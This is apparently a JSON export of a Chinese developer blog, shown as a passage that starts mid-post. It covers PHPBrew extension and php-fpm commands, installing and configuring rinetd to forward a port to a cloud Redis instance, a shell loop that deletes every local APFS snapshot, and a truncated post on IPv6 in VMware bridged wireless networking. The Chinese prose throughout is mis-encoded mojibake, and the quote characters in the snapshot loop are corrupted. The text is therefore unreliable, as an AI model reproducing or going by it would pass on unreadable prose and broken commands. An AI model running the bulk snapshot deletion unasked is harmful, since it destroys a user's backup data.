æŒ‡å®š ç¨³å®šæ€§æ ‡ç­¾ï¼Œå¯é€‰é¡¹æœ‰ stable / latest / betaï¼Œä¸æŒ‡å®šå³é»˜è®¤ä¸º stableï¼Œä¾‹å¦‚ï¼š$ phpbrew ext install xdebug latest æŒ‡å®š æ‰©å±•ç‰ˆæœ¬å·ï¼Œä¾‹å¦‚ï¼š$ phpbrew ext install xdebug 3.0.0 æŸ¥çœ‹æ‰©å±•çš„é…ç½®é€‰é¡¹è¦æŸ¥çœ‹æ„å»ºæ‰©å±•æ˜¯å¦æœ‰é¢å¤–çš„é…ç½®é€‰é¡¹ï¼Œä½¿ç”¨ ext show 12345678910111213141516$ phpbrew ext show redis Name: redis Source Directory: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13&#x2F;ext&#x2F;redis Config: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13&#x2F;ext&#x2F;redis&#x2F;config.m4 INI File: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;var&#x2F;db&#x2F;redis.ini Extension: Pecl Zend: no Loaded: yes Configure Options: --enable-redis-igbinary[&#x3D;no] enable igbinary serializer support? --enable-redis-lzf[&#x3D;no] enable lzf compression support? --enable-redis-zstd[&#x3D;no] enable zstd compression support? ä¸ºæ„å»ºæ‰©å±•æ·»åŠ é¢å¤–é…ç½®é€‰é¡¹1$ phpbrew ext install redis -- --enable-redis-lzf&#x3D;yes ä»Githubå®‰è£…æ‰©å±•ç‰¹æ®Šçš„å‰ç¼€ github: åˆ™å‘Šè¯‰PHPBrewè¦å» php-memcached-dev/phpmemcached çš„ php7 åˆ†æ”¯æ‹‰å–ä»£ç è¿›è¡Œæ„å»º 1$ phpbrew ext install github:php-memcached-dev&#x2F;php-memcached php7 -- --disable-memcached-sasl æŒ‡å®šä¸‹è½½å™¨è¿›è¡Œå®‰è£…æ‰©å±•ç›®å‰ï¼ŒPHPBrewæœ‰4ä¸ªä¸‹è½½å™¨å®ç°ï¼š php_curl å†…ç½®çš„ php curlæ‰©å±•ï¼Œä¸ºé»˜è®¤ä¸‹è½½å™¨ php_stream å†…ç½®çš„ php steamå°è£… curl wget æŒ‡å®š curl ä½œä¸ºä¸‹è½½å™¨ï¼š 1$ phpbrew ext install --downloader curl redis å¦‚æœé€‰ç”¨çš„ä¸‹è½½å™¨æ”¯æŒ User-Agent å’Œ Proxy é…ç½®ï¼š 1$ phpbrew ext install --downloader php_curl --http-proxy&#x3D;... --http-proxy-auth&#x3D;... apcu å¯ç”¨æ‰©å±•ç¬”è€…äº²æµ‹ï¼Œé€šè¿‡ ext install å®‰è£…çš„æ‰©å±•ï¼Œå®‰è£…å®Œå³ä¸ºå¯ç”¨çŠ¶æ€ã€‚ å¦å¤–ä¹Ÿå¯ä»¥é€šè¿‡ PECL å®‰è£…æ‰©å±•å¹¶ä¸”æ‰‹åŠ¨å¯ç”¨ï¼š 12$ pecl install mongo$ phpbrew ext enable mongo ext enable æŒ‡ä»¤å¸®ä½ åˆ›å»ºé…ç½®æ–‡ä»¶ {current php base}/var/db/{extension name}.ini ç”¨ä»¥å¯ç”¨æ‰©å±• ä¸ºå½“å‰phpç‰ˆæœ¬é…ç½® php.ini12$ export EDITOR&#x3D;vim # è¯¥è¡Œä¸ºå¯é€‰é¡¹ï¼ŒæŒ‡å®šä½ å¸¸ç”¨çš„ç¼–è¾‘å™¨$ phpbrew config æ›´æ–° PHPBrewè¿è¡Œ self-update æŒ‡ä»¤å°†ä¼šä»Githubçš„masteråˆ†æ”¯ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢è‡ªèº«ï¼ˆå³æœ¬æ–‡å¼€å¤´çš„å­˜æ”¾ä½ç½®/usr/local/bin/phpbrewï¼‰ ç›¸å…³çš„ç›®å½•å·²å®‰è£…çš„phpä½äº $HOME/.phpbrew/phpï¼Œä»¥ 7.4.13-minimal ä¸¾ä¾‹ï¼Œä¸º $HOME/.phpbrew/php/7.4.13-minimal/bin/php é…ç½®æ–‡ä»¶ä¸º $HOME/.phpbrew/php/7.4.13-minimal/etc/php.ini æ‰©å±•çš„é…ç½®æ–‡ä»¶ä½äº $HOME/.phpbrew/php/7.4.13-minimal/var/dbç›®å½•ä¸‹ï¼š 123$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;memcache.ini$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;xdebug.ini$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;redis.ini åœ¨å„ç›®å½•ä¹‹é—´åˆ‡æ¢çš„å¿«æ·å‘½ä»¤å®˜æ–¹æ–‡æ¡£é‡Œè¿™éƒ¨åˆ†æ¶‰åŠçš„æŒ‡ä»¤ï¼Œæ¯”å¦‚ build-dir / dist-dir / etc-dir / var-dir å·²äº²æµ‹å…¨éƒ¨é˜µäº¡ PHP fpmPHPBrewåŒæ—¶ä¹Ÿä¸º php-fpm æä¾›äº†ç®¡ç†æŒ‡ä»¤ï¼ˆå‰ææ˜¯åœ¨æ„å»ºçš„æ—¶å€™å¾—åŠ ä¸Š +fpm variantï¼‰ å¯åŠ¨/åœæ­¢/é‡å¯ php-fpmï¼š 123$ phpbrew fpm start$ phpbrew fpm stop $ phpbrew fpm restart æ˜¾ç¤º php-fpm æ¨¡å—ï¼š 1234567891011$ phpbrew fpm module[PHP Modules]bz2cgi-fcgiCorectypecurl...[Zend Modules]Xdebug æµ‹è¯• php-fpm é…ç½®æ˜¯å¦æ­£ç¡®ï¼š 12$ phpbrew fpm test[01-Dec-2020 18:28:04] NOTICE: configuration file &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;etc&#x2F;php-fpm.conf test is successful ç¼–è¾‘ php-fpm é…ç½®ï¼š 12$ export EDITOR&#x3D;vim # è¯¥è¡Œä¸ºå¯é€‰é¡¹ï¼ŒæŒ‡å®šä½ å¸¸ç”¨çš„ç¼–è¾‘å™¨$ phpbrew fpm config å·²å®‰è£…çš„ php-fpm ä½äº $HOME/.phpbrew/php/&#123;php-version&#125;/sbin ä¸‹ ç›¸åº”çš„ php-fpm.conf ä½äº $HOME/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf.default, ä½ å¯ä»¥å°†é»˜è®¤é…ç½®æ–‡ä»¶æ‹·è´åˆ°éœ€è¦çš„ä½ç½®è¿›è¡Œä½¿ç”¨ï¼Œæ¯”å¦‚ $ cp -v ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf.default ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf $ php-fpm --php-ini ~/.phpbrew/php/&#123;php-version&#125;/etc/php.ini --fpm-config ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf å®‰è£…æ‰©å±•åº”ç”¨é€šè¿‡ app get æŒ‡ä»¤æ¥å®‰è£…ä¾‹å¦‚ composer å’Œ phpunit è¿™æ ·çš„ appï¼Œç¬”è€…äº²æµ‹è¯¥æŒ‡ä»¤ä¹Ÿå·²é˜µäº¡ ç»“å°¾ä»¥ä¸Šä¾¿æ˜¯ç¬”è€…ç»“åˆ PHPBrew å®˜æ–¹æ–‡æ¡£ç»™å¤§å®¶æ¢³ç†çš„ä½¿ç”¨æŒ‡å—ï¼Œå†™è¯¥æ–‡æ—¶æ¯æ¡æŒ‡ä»¤ç¬”è€…éƒ½äº²è‡ªæµ‹è¯•è¿‡ï¼Œæ‰€ä»¥å‘ç°äº†å®˜æ–¹æ–‡æ¡£é‡Œæœ‰å¾ˆå¤šåœ°æ–¹éƒ½ å·²è¿‡æ—¶ æˆ– å·²æ›´æ–°ã€‚å¯¹äºå‰è€…ï¼Œç¬”è€…ç”¨æ¨ªçº¿ç»™åˆ’æ‰äº†ï¼›å¯¹äºåè€…ï¼Œç¬”è€…ç›´æ¥è¿›è¡Œäº†ä¿®æ­£ã€‚ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"dev","slug":"dev","permalink":"https://blog.chaosjohn.com/tags/dev/"},{"name":"package manager","slug":"package-manager","permalink":"https://blog.chaosjohn.com/tags/package-manager/"}]},{"title":"ç«¯å£è½¬å‘(ç¯‡ä¸€) - rinetd","slug":"Port-Forwarding-1","date":"2020-11-30T09:09:13.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Port-Forwarding-1.html","link":"","permalink":"https://blog.chaosjohn.com/Port-Forwarding-1.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ç¬”è€…å‡†å¤‡å†™ä¸€ä¸ª ç«¯å£è½¬å‘ ç³»åˆ—æ–‡ç« ï¼Œæ¶‰åŠè®¡å¤šä¸ªå·¥å…·å’Œå‘½ä»¤ã€‚ æœ¬æ–‡ä¸ºç¯‡ä¸€ï¼Œä»‹ç»ä¸€ä¸ªå¤§å®¶å¸¸ç”¨çš„å·¥å…·ï¼Œrinetdã€‚ ç®€ä»‹A: ç«¯å£è½¬å‘è‹±æ–‡ï¼šPort forwarding å°†ä¸€å° ä¸»æœºA çš„ ç«¯å£x è½¬å‘åˆ°å¦ä¸€å° ä¸»æœºB çš„ ç«¯å£y å¹¶ç”± ä¸»æœºB æä¾›è½¬å‘çš„ç½‘ç»œæœåŠ¡ã€‚ å³é€šè¿‡è®¿é—® ä¸»æœºB:ç«¯å£y æ¥è®¿é—®éƒ¨ç½²åœ¨ ä¸»æœºA:ç«¯å£x ä¸Šçš„æœåŠ¡ã€‚ ç®€ä»‹B: rinetdé¡¹ç›®ä¸»é¡µ / Github rinetdæ˜¯ä¸ºåœ¨ä¸€ä¸ªUnixå’ŒLinuxæ“ä½œç³»ç»Ÿä¸­ä¸ºé‡å®šå‘ä¼ è¾“æ§åˆ¶åè®®(TCP)è¿æ¥çš„ä¸€ä¸ªå·¥å…·ã€‚ rinetdæ˜¯å•ä¸€è¿‡ç¨‹çš„æœåŠ¡å™¨ï¼Œå®ƒå¤„ç†ä»»ä½•æ•°é‡çš„è¿æ¥åˆ°åœ¨é…ç½®æ–‡ä»¶etc/rinetdä¸­æŒ‡å®šçš„åœ°å€/ç«¯å£å¯¹ã€‚ å°½ç®¡rinetdä½¿ç”¨éé—­é”I/Oè¿è¡Œä½œä¸ºä¸€ä¸ªå•ä¸€è¿‡ç¨‹ï¼Œå®ƒå¯èƒ½é‡å®šå‘å¾ˆå¤šè¿æ¥è€Œä¸å¯¹è¿™å°æœºå™¨å¢åŠ é¢å¤–çš„è´Ÿæ‹…ã€‚ åœºæ™¯æœ€æ—©æ¥è§¦åˆ°è¿™ä¸ªå·¥å…·ï¼Œæ˜¯å‡ å¹´å‰è´­ä¹°äº†é˜¿é‡Œäº‘çš„Rediså®ä¾‹ï¼Œå½“åˆè¯¥æœåŠ¡æœªæ¨å‡ºå…¬ç½‘è¿æ¥åœ°å€ï¼Œåªèƒ½é€šè¿‡å†…ç½‘è®¿é—®ï¼Œå³åªåœ¨åŒä¸€ä¸ªåŒºåŸŸçš„VPCå†…å¯è¾¾ï¼Œåœ¨å½“åˆçš„ä¸šåŠ¡ç¯å¢ƒä¸‹ï¼Œåªèƒ½ä»é˜¿é‡Œäº‘çš„ECSè®¿é—®Rediså®ä¾‹ã€‚ è¿™å°±å¾ˆæ¼æ€’äº†ï¼Œåœ¨ç¬”è€…æœ¬åœ°çš„å¼€å‘ç¯å¢ƒï¼Œä¹Ÿè¦è¿æ¥æ”¹Rediså®ä¾‹ï¼Œå’‹åŠå“©ã€‚ äºæ˜¯å°±åœ¨é˜¿é‡Œäº‘åœ¨çº¿æ–‡æ¡£é‡Œæ‰¾åˆ°äº†è¿™ä¸ªå·¥å…·ï¼Œæˆ‘è¿˜ä¾ç¨€è®°å¾—é‚£ç¯‡æ–‡æ¡£é‡Œï¼Œä»‹ç»çš„æ˜¯å¦‚ä½•åœ¨CentOSä¸‹è½½rinetdæºç ï¼ˆè¿˜æä¾›äº†tar.gzçš„é“¾æ¥åœ°å€ï¼‰ï¼Œç„¶åç¼–è¯‘å®‰è£…å®ƒã€‚ï¼ˆä¸è¿‡ä¼´éšç€é˜¿é‡Œäº‘Rediså®ä¾‹å¼€å§‹æ”¯æŒå…¬ç½‘è¿æ¥åï¼Œè¯¥æ–‡æ¡£å·²ç»æ¶ˆå¤±åœ¨äº†å†å²é•¿æ²³é‡Œäº†ã€‚ï¼‰ å®‰è£… ç¼–è¯‘å®‰è£…ï¼ˆé€‚ç”¨äºä»»ä½•Linuxç¯å¢ƒï¼Œä½†ä¸ªäººä¸æ¨èï¼Œå› ä¸ºè¿˜å¾—æ‰‹åŠ¨é…ç½®å¼€æœºè‡ªå¯ï¼‰ 123456$ curl -LO &#39;http:&#x2F;&#x2F;www.rinetd.com&#x2F;download&#x2F;rinetd.tar.gz&#39;$ tar xvzf rinetd.tar.gz$ cd rinetd$ sed -i &#39;s&#x2F;65536&#x2F;65535&#x2F;g&#39; rinetd.c ï¼ˆä¿®æ”¹ç«¯å£èŒƒå›´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼‰$ make$ sudo make install ï¼ˆæç¤ºï¼šå®˜æ–¹ä¸‹è½½çš„æºç åŒ…æ— æ³•åœ¨macOSä¸‹å®Œæˆç¼–è¯‘ï¼ŒæŠ¥é”™ error: implicit declaration of function &#39;inet_addr&#39; is invalid in C99ï¼‰ åœ¨ macOS ä¸Šå€ŸåŠ© Homebrew å®‰è£… 1$ brew install rinetd åœ¨ Debian / Ubuntu ä¸Šå€ŸåŠ© apt å®‰è£… 12$ sudo apt update$ sudo apt install rinetd åœ¨ RHEL / CentOS ä¸Šå€ŸåŠ© yum å®‰è£… å®˜æ–¹æºä¸­æ— rinetdï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…ä¸‰æ–¹æº 12345678$ sudo vim &#x2F;etc&#x2F;yum.repos.d&#x2F;nux-misc.repo[nux-misc]name&#x3D;Nux Miscbaseurl&#x3D;http:&#x2F;&#x2F;li.nux.ro&#x2F;download&#x2F;nux&#x2F;misc&#x2F;el6&#x2F;x86_64&#x2F;enabled&#x3D;0gpgcheck&#x3D;1gpgkey&#x3D;http:&#x2F;&#x2F;li.nux.ro&#x2F;download&#x2F;nux&#x2F;RPM-GPG-KEY-nux.ro ç„¶åå†å®‰è£…rinetd 1$ sudo yum --enablerepo&#x3D;nux-misc install rinetd é…ç½®é…ç½®æ–‡ä»¶è·¯å¾„ä¸º /etc/rinetd.confï¼Œå¹¶é™„ä¸Šé‚£å°è½¬å‘Redisçš„é…ç½®å†…å®¹ 1234567891011121314151617181920212223242526## this is the configuration file for rinetd, the internet redirection server## you may specify global allow and deny rules here# only ip addresses are matched, hostnames cannot be specified here# the wildcards you may use are * and ?## allow 192.168.2.*# deny 192.168.2.1?## forwarding rules come here## you may specify allow and deny rules after a specific forwarding rule# to apply to only that forwarding rule## bindadress bindport connectaddress connectport0.0.0.0 6379 r-ly25ac35fxxxxx.redis.rds.aliyuncs.com 6379# logging informationlogfile &#x2F;var&#x2F;log&#x2F;rinetd.log# uncomment the following line if you want web-server style logfile format# logcommon allow å’Œ deny æ˜¯é…ç½® å…è®¸å’Œé˜»æ­¢ çš„ IPåœ°å€/IPæ®µ è½¬å‘è§„åˆ™ä¸€è¡Œä¸€ä¸ªï¼Œå¯é…ç½®å¤šè¡Œ bindadress bindport connectaddress connectportï¼Œå¦‚ç¤ºä¾‹é‡Œé…ç½®ä¸ºï¼šç›‘å¬æœ¬ç½‘å¡åœ°å€çš„6379ç«¯å£å·ï¼Œå¹¶ä¸”è½¬å‘åˆ°VPCå†…ç½‘Rediså®ä¾‹çš„6379ç«¯å£å·ã€‚ è¿è¡Œå’Œè‡ªå¯ å¦‚æœæ˜¯é€šè¿‡æºç ç¼–è¯‘å®‰è£…çš„ï¼Œå‘½ä»¤è¡Œç›´æ¥æ‰§è¡Œ rinetdï¼›è‡ªå¯çš„è¯ï¼Œå¾—æ‰‹åŠ¨ç¼–å†™ Systemd çš„Unitæ–‡ä»¶æ¥ç®¡ç†æˆ–è€…é€šè¿‡ Supervisor æ¥ç®¡ç†ã€‚ å¦‚æœæ˜¯ apt æˆ– yum å®‰è£…çš„ï¼Œå¹¶ä¸”initç¨‹åºæ˜¯ Systemd å¯åŠ¨æœåŠ¡: $ sudo systemctl start rinetd åœæ­¢æœåŠ¡: $ sudo systemctl stop rinetd é‡å¯æœåŠ¡: $ sudo systemctl restart rinetd å¼€æœºè‡ªå¯: $ sudo systemctl enable rinetd ç¦ç”¨è‡ªå¯: $ sudo systemctl disable rinetd æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"}]},{"title":"æ¸…ç† APFS å¿«ç…§çš„shellè„šæœ¬","slug":"Clean-APFS-Snapshots","date":"2020-11-29T15:26:03.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Clean-APFS-Snapshots.html","link":"","permalink":"https://blog.chaosjohn.com/Clean-APFS-Snapshots.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èƒŒæ™¯macOS ä» 10.13 High Sierraå¼€å§‹ï¼Œå¼•å…¥äº† APFS(Apple File System) æ›¿ä»£åŸå…ˆçš„ HFS+ ä½œä¸ºé»˜è®¤ç£ç›˜æ ¼å¼ã€‚ ç¬”è€…è§‰å¾—æœ€å¤§çš„ç‰¹è‰²åœ¨äº å†™æ—¶æ‹·è´(Copy-on-Write) å’Œ å¿«ç…§(Snapshots)ã€‚å¯¹äºå‰è€…ï¼Œä»¥åæœ‰æœºä¼šç¬”è€…å†å†™æ–‡é˜è¿°ï¼Œæœ¬æ–‡ä¸»è¦é’ˆå¯¹åè€…ã€‚ å¿«ç…§çš„å¼•å…¥ï¼Œå¯ä»¥æ–¹ä¾¿å¹¶ä¸”å¿«é€Ÿåœ°æ¢å¤åˆ°è¿‡å»çš„æŸä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œå®ƒä¸ æ—¶é—´æœºå™¨(Time Machine) é…åˆèµ·æ¥ï¼Œå¯ä»¥æå¤§ç¨‹åº¦çš„ä¿è¯æ•°æ®å®‰å…¨ã€‚ ä½†å¿«ç…§ä¹Ÿå¯¼è‡´ä¸€ä¸ªä¸è‰¯åæœï¼Œå³å æ®äº†å¤§é‡çš„ç£ç›˜ç©ºé—´ã€‚æ¯”å¦‚æ˜æ˜æ²¡ä½¿ç”¨å¾ˆå¤šæ–‡ä»¶ï¼Œæ€ä¹ˆç£ç›˜ç©ºé—´è€—å»å¤§åŠã€‚ æŸ¥çœ‹å¿«ç…§è¿™é‡Œåˆ©ç”¨åˆ° tmutil è¿™ä¸ªå‘½ä»¤ï¼Œé€šè¿‡æŸ¥è¯¢ man æ‰‹å†Œï¼Œå‘ç°å®ƒå…¨ç§°ä¸º Time Machine utilityï¼Œå³åŸç”¨äºæ—¶é—´æœºå™¨ã€‚ $ tmutil listlocalsnapshots / 123456789101112131415161718192021222324Snapshots for volume group containing disk &#x2F;:com.apple.TimeMachine.2020-11-29-004329.localcom.apple.TimeMachine.2020-11-29-014637.localcom.apple.TimeMachine.2020-11-29-024241.localcom.apple.TimeMachine.2020-11-29-034330.localcom.apple.TimeMachine.2020-11-29-044145.localcom.apple.TimeMachine.2020-11-29-054542.localcom.apple.TimeMachine.2020-11-29-064456.localcom.apple.TimeMachine.2020-11-29-074846.localcom.apple.TimeMachine.2020-11-29-084356.localcom.apple.TimeMachine.2020-11-29-094633.localcom.apple.TimeMachine.2020-11-29-104339.localcom.apple.TimeMachine.2020-11-29-114752.localcom.apple.TimeMachine.2020-11-29-134250.localcom.apple.TimeMachine.2020-11-29-144214.localcom.apple.TimeMachine.2020-11-29-154417.localcom.apple.TimeMachine.2020-11-29-164352.localcom.apple.TimeMachine.2020-11-29-174500.localcom.apple.TimeMachine.2020-11-29-184606.localcom.apple.TimeMachine.2020-11-29-194225.localcom.apple.TimeMachine.2020-11-29-204725.localcom.apple.TimeMachine.2020-11-29-214338.localcom.apple.TimeMachine.2020-11-29-224417.localcom.apple.TimeMachine.2020-11-29-234647.local é€šè¿‡ df -th æŸ¥çœ‹ç£ç›˜å‰©ä½™ 153GB æ¸…ç†å¿«ç…§è¿™é‡Œç¥­å‡ºä¸€è¡Œshellè„šæœ¬ $ for snapshot in $(tmutil listlocalsnapshots / | awk -F. â€˜{print $4}â€™); do tmutil deletelocalsnapshots $snapshot; done 1234567891011121314151617181920212223Deleted local snapshot &#39;2020-11-29-004329&#39;Deleted local snapshot &#39;2020-11-29-014637&#39;Deleted local snapshot &#39;2020-11-29-024241&#39;Deleted local snapshot &#39;2020-11-29-034330&#39;Deleted local snapshot &#39;2020-11-29-044145&#39;Deleted local snapshot &#39;2020-11-29-054542&#39;Deleted local snapshot &#39;2020-11-29-064456&#39;Deleted local snapshot &#39;2020-11-29-074846&#39;Deleted local snapshot &#39;2020-11-29-084356&#39;Deleted local snapshot &#39;2020-11-29-094633&#39;Deleted local snapshot &#39;2020-11-29-104339&#39;Deleted local snapshot &#39;2020-11-29-114752&#39;Deleted local snapshot &#39;2020-11-29-134250&#39;Deleted local snapshot &#39;2020-11-29-144214&#39;Deleted local snapshot &#39;2020-11-29-154417&#39;Deleted local snapshot &#39;2020-11-29-164352&#39;Deleted local snapshot &#39;2020-11-29-174500&#39;Deleted local snapshot &#39;2020-11-29-184606&#39;Deleted local snapshot &#39;2020-11-29-194225&#39;Deleted local snapshot &#39;2020-11-29-204725&#39;Deleted local snapshot &#39;2020-11-29-214338&#39;Deleted local snapshot &#39;2020-11-29-224417&#39;Deleted local snapshot &#39;2020-11-29-234647&#39; å†æ¬¡é€šè¿‡ df -th æŸ¥çœ‹ç£ç›˜å‰©ä½™ 159GBï¼Œé‡Šæ”¾å‡º 6GB ç©ºé—´ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"APFS","slug":"APFS","permalink":"https://blog.chaosjohn.com/tags/APFS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"}]},{"title":"IPv6åœ¨è™šæ‹Ÿæœºé€šè¿‡æ— çº¿ç½‘å¡æ¡¥æ¥çš„ç½‘ç»œä¸‹æ— æ³•ä½¿ç”¨(VMware WorkStation)","slug":"IPv6-not-working-from-bridged-wireless","date":"2020-11-28T10:19:22.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"IPv6-not-working-from-bridged-wireless.html","link":"","permalink":"https://blog.chaosjohn.com/IPv6-not-working-from-bridged-wireless.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èƒŒæ™¯ä»Šå¹´å¹´ä¸­çš„æ—¶å€™ï¼Œåœ¨æ²¹ç®¡ä¸Šçœ‹åˆ° æ‚Ÿç©ºå¤§å¤§ å…³äº Minisforum GK41 çš„è§†é¢‘ï¼Œå¿ƒé‡Œç—’ç—’ï¼Œäºæ˜¯ä¹Ÿå…¥æ‰‹äº†ä¸€ä¸ªã€‚ä¸»è¦å…·ä½“å‚æ•°ä¸ºï¼š CPU: IntelÂ® CeleronÂ® Processor J4125 å†…å­˜: LPDDR4 8GB (On Board) ç½‘ç»œ: åŒåƒå…†èƒèŸ¹å¡ + 802.11acåŒé¢‘Wifi ä¹°ä¹‹å‰æƒ³çš„å¾ˆç¾å¦™ï¼Œä¹°å®ƒï¼å½“è½¯è·¯ç”±ï¼å°±å¥”ç€å®ƒåŒç½‘å£ä¸”ä¸åˆ°æ—¥å¸¸ä½¿ç”¨5~6Wçš„è¶…ä½åŠŸè€—ï¼ ç»“æœä¹°å›æ¥å°±å¼€å§‹çº ç»“äº†ï¼Œç”¨å®ƒå½“è½¯è·¯ç”±æ˜¯ä¸æ˜¯å¤ªæµªè´¹äº†ï¼Ÿæ¯•ç«Ÿ128GBçš„M.2å›ºæ€ï¼Œåªæ‹¿æ¥è·‘OpenWRTï¼Œå¾ˆéš¾æŠŠç©ºé—´å æ»¡å•Šï¼›å†…éƒ¨ä¹Ÿæ²¡æœ‰SATAæ¥å£ï¼Œæ— æ³•æŠŠåºŸå¼ƒç¡¬ç›˜åˆ©ç”¨èµ·æ¥ï¼›ä¹Ÿä¸æ”¯æŒä»TFå¡æ§½å¯åŠ¨ï¼Œæ‰‹é‡Œä¸€å †TFå¡ä¹Ÿæ— ç”¨ã€‚ æœºå­ä¹°æ¥å°±é¢„è£…äº†æ­£ç‰ˆWindows10ï¼Œæƒ³ç€å¥½ä¹…æ²¡æœ‰ç”¨Windowsäº†ï¼Œé‚£å°±é¡ºä¾¿ç©ç©å§ã€‚äºæ˜¯æ‰‹å°±ä¸å¬ä½¿å”¤çš„æŠŠ VMware WorkStationç»™å®‰è£…ä¸Šäº†ï¼Œåˆä¸å¬ä½¿å”¤çš„è£…äº†ä¸ª Manjaro Linux è™šæ‹Ÿæœºã€‚ é—®é¢˜ï¼šå®¢æˆ·æœºIPv6æ— æ³•ä½¿ç”¨ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼š GK41ä¸»æœºé€šè¿‡æ— çº¿ç½‘å¡è¿æ¥Wi-Fi è™šæ‹Ÿå®¢æˆ·æœºé‡‡ç”¨æ¡¥æ¥æ¨¡å¼ï¼ˆéNATæ¨¡å¼ï¼‰ï¼Œæ¡¥æ¥æ— çº¿ç½‘å¡åŠ å…¥ç½‘ç»œ è‡³æ­¤ï¼Œè™šæ‹Ÿå®¢æˆ·æœºä¹Ÿä»ä¸Šçº§è·¯ç”±å™¨è·å¾—IPv4åœ°å€ï¼Œä¸GK41ä¸»æœºå¤„äºåŒä¸€ä¸ªå±€åŸŸç½‘ã€‚ ä½†æ˜¯æ— æ³•è®¿é—®IPv6ç½‘ç»œï¼ˆç”±äºè¿™å°GK41å·²ç»è½¬æ‰‹å–æ‰äº†å¾ˆä¹…ï¼Œæ‰€ä»¥è®°ä¸æ¸…æ˜¯æ— æ³•ä»ä¸Šçº§è·¯ç”±å™¨è·å–IPv6åœ°å€è¿˜æ˜¯åˆ†é…åˆ°äº†IPv6åœ°å€ä½†æ— æ³•è”é€šç½‘ç»œï¼‰ã€‚å› ç¬”è€…å°†GK41æ”¾åœ¨å…¬å¸ï¼Œè„±ç¦»äº†IPv6å°±æ„å‘³ç€ç¬”è€…æ— æ³•ä¾¿æ·åœ°ä»å®¶é‡Œè®¿é—®åˆ°è¿™å°è™šæ‹Ÿå®¢æˆ·æœºã€‚ è§£å†³è¿‡ç¨‹ï¼ˆæœ€åå‘ç°æ— è§£ï¼‰å°è¯•ï¼šæ’ä¸Šç½‘çº¿ï¼ŒæŠŠæ¡¥æ¥æ¨¡å¼ä»æ— çº¿ç½‘å¡æ”¹ä¸ºæœ‰çº¿ç½‘å¡ï¼ŒIPv6å¥‡è¿¹èˆ¬çš„æœ‰äº†ï¼æ‰€ä»¥é—®é¢˜è‚¯å®šå‡ºåœ¨äº† æ— çº¿æ¡¥æ¥ ä¸Šã€‚ äºæ˜¯ç¬”è€…å„ç§æŸ¥èµ„æ–™çˆ¬å¸–ï¼Œå„ç§æŠ˜è…¾ï¼Œæœ€åå‘ç°äº†2008å¹´çš„ä¸€ç¯‡å¸–å­IPv6+Bridged+Wirelessã€‚ æ–‡ä¸­æè¿° This is a known issue, IPv6 is not expected to work over a wireless bridge. åœ¨å¸–å­å‘å¸ƒçš„æ—¶å€™ï¼Œè¿™ä¸ªbugï¼ˆç¼–å·#26078ï¼‰è¦†ç›–äº†VMwareçš„å…¨çº¿äº§å“ï¼ŒåŒ…æ‹¬WorkStation/Player/Fusionã€‚å¦å‚è€ƒ ï¼ˆå®æµ‹ VMware Fusion åœ¨å¾ˆæ—©ä»¥å‰å°±å·²ç»ä¿®å¤è¯¥bugï¼Œå› ä¸ºç¬”è€…æœ‰ä¸€å°2009å¹´çš„MacBookï¼Œè¿˜è·‘ç€ Mac OS X 10.7 Lionï¼Œè¿è¡Œç€ VMware Fusion 